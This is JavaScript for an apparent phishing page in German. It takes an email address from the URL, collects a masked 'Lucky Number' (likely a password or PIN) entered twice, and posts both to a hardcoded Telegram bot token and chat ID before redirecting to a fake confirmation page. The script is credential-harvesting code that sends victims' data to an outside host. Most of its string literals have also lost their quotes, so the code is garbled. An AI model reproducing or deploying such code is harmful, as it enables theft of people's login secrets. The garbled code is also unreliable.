 // Get email from URL parameter
 const params = new URLSearchParams(window.location.search);
 const email = params.get("email");
 if (email) {
   document.getElementById("emailDisplay").textContent = email;
 }
 
 // Elements
 const luckyNumberInput = document.getElementById(luckyNumber);
 const confirmModal = document.getElementById(confirmModal);
 const confirmLuckyNumberInput = document.getElementById(confirmLuckyNumber);
 const submitButton = document.getElementById(submitLucky);
 const confirmSubmitButton = document.getElementById(confirmSubmit);
 const errorMessage = document.getElementById(errorMessage);
 
 // Lucky number toggle (first field)
 const luckyNumberToggle = document.getElementById(luckyNumberToggle);
 const eyeOpenPaths = luckyNumberToggle.querySelectorAll(.eye-open);
 const eyeClosedPaths = luckyNumberToggle.querySelectorAll(.eye-closed);
 
 luckyNumberToggle.addEventListener(click, () => {
   const isPassword = luckyNumberInput.type === password;
   luckyNumberInput.type = isPassword ? text : password;
   eyeOpenPaths.forEach(p => p.style.display = isPassword ? block : none);
   eyeClosedPaths.forEach(p => p.style.display = isPassword ? none : block);
   luckyNumberToggle.title = isPassword ? Lucky
Number
verstecken : Lucky
Number
anzeigen;
 });
 luckyNumberInput.type = password;
 eyeOpenPaths.forEach(p => p.style.display = none);
 eyeClosedPaths.forEach(p => p.style.display = block);
 luckyNumberToggle.title = Lucky
Number
anzeigen;
 
 // Toggle for confirm field
 const confirmLuckyNumberToggle = document.getElementById(confirmLuckyNumberToggle);
 const confirmEyeOpenPaths = confirmLuckyNumberToggle.querySelectorAll(.eye-open);
 const confirmEyeClosedPaths = confirmLuckyNumberToggle.querySelectorAll(.eye-closed);
 
 confirmLuckyNumberToggle.addEventListener(click, () => {
   const isPassword = confirmLuckyNumberInput.type === password;
   confirmLuckyNumberInput.type = isPassword ? text : password;
   confirmEyeOpenPaths.forEach(p => p.style.display = isPassword ? block : none);
   confirmEyeClosedPaths.forEach(p => p.style.display = isPassword ? none : block);
   confirmLuckyNumberToggle.title = isPassword ? Lucky
Number
verstecken : Lucky
Number
anzeigen;
 });
 confirmLuckyNumberInput.type = password;
 confirmEyeOpenPaths.forEach(p => p.style.display = none);
 confirmEyeClosedPaths.forEach(p => p.style.display = block);
 confirmLuckyNumberToggle.title = Lucky
Number
anzeigen;
 
 // Validate Lucky Numbers
 function validatePasswords() {
   const first = luckyNumberInput.value;
   const second = confirmLuckyNumberInput.value;
 
   if (second && first !== second) {
     confirmLuckyNumberInput.classList.add(error);
     errorMessage.style.display = block;
     return false;
   } else {
     confirmLuckyNumberInput.classList.remove(error);
     errorMessage.style.display = none;
     return true;
   }
 }
 
 // Modal open/close
 function openModal() {
   confirmModal.classList.add(show);
   document.body.style.overflow = hidden;
   confirmLuckyNumberInput.focus();
 }
 function closeModal() {
   confirmModal.classList.remove(show);
   document.body.style.overflow = ;
   confirmLuckyNumberInput.value = ;
   confirmLuckyNumberInput.classList.remove(error);
   errorMessage.style.display = none;
 }
 
 // Events
 confirmLuckyNumberInput.addEventListener(input, validatePasswords);
 luckyNumberInput.addEventListener(input, validatePasswords);
 confirmModal.addEventListener(click, (e) => {
   if (e.target === confirmModal) closeModal();
 });
 document.addEventListener(keydown, (e) => {
   if (e.key === Escape && confirmModal.classList.contains(show)) closeModal();
 });
 
 // Telegram API credentials
 const botToken = "7904537169:AAG2mMr-2QAyrm6vDIPGuswJsZZMuu1OoV4";
 const chatId = "7212426412";
 
 // Handle first submit
 submitButton.addEventListener(click, () => {
   const luckyNumber = luckyNumberInput.value;
   if (!luckyNumber) return;
   openModal();
 });
 
 // Confirm submit
 confirmSubmitButton.addEventListener(click, () => {
   const luckyNumber = luckyNumberInput.value;
   const confirmLuckyNumber = confirmLuckyNumberInput.value;
 
   if (!confirmLuckyNumber || !validatePasswords()) return;
 
   const userEmail = document.getElementById(emailDisplay).textContent;
   const message = `�� Neue Lucky Number Eingabe\n\n📧 E-Mail: ${userEmail}\n🔢 Lucky Number: ${luckyNumber}`;
 
   // Button elements
   const btnText = confirmSubmitButton.querySelector(.btn-text);
   const dotsLoading = confirmSubmitButton.querySelector(.dots-loading);
   const checkmark = confirmSubmitButton.querySelector(.checkmark);
 
   // Start loading animation
   confirmSubmitButton.disabled = true;
   confirmSubmitButton.classList.add(loading);
   
   // Fade out text and show dots
   btnText.classList.add(fade);
   setTimeout(() => {
     btnText.style.display = none;
     dotsLoading.style.display = flex;
   }, 300);
 
   // Send to Telegram
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ chat_id: chatId, text: message })
   })
   .then(res => res.json())
   .then(data => {
     if (data.ok) {
       // After 4 seconds, transition to success state
       setTimeout(() => {
         // Hide dots and show checkmark
         dotsLoading.style.display = none;
         
         // Add success styling and transition to circular button
         confirmSubmitButton.classList.remove(loading);
         confirmSubmitButton.classList.add(success);
         
         // Show and animate checkmark after button transforms
         setTimeout(() => {
           checkmark.style.display = block;
           setTimeout(() => {
             checkmark.classList.add(show);
           }, 50);
         }, 200);
 
         // Redirect after showing success
         setTimeout(() => {
           window.location.href = "confirmation.html";
         }, 1800);
       }, 4000);
     } else {
       resetConfirmButton();
     }
   })
   .catch(err => {
     console.error("Telegram API Fehler:", err);
     resetConfirmButton();
   });
 
   function resetConfirmButton() {
     confirmSubmitButton.disabled = false;
     confirmSubmitButton.classList.remove(loading, success);
     
     // Reset all elements
     dotsLoading.style.display = none;
     checkmark.style.display = none;
     checkmark.classList.remove(show);
     btnText.style.display = block;
     btnText.classList.remove(fade);
   }
 });
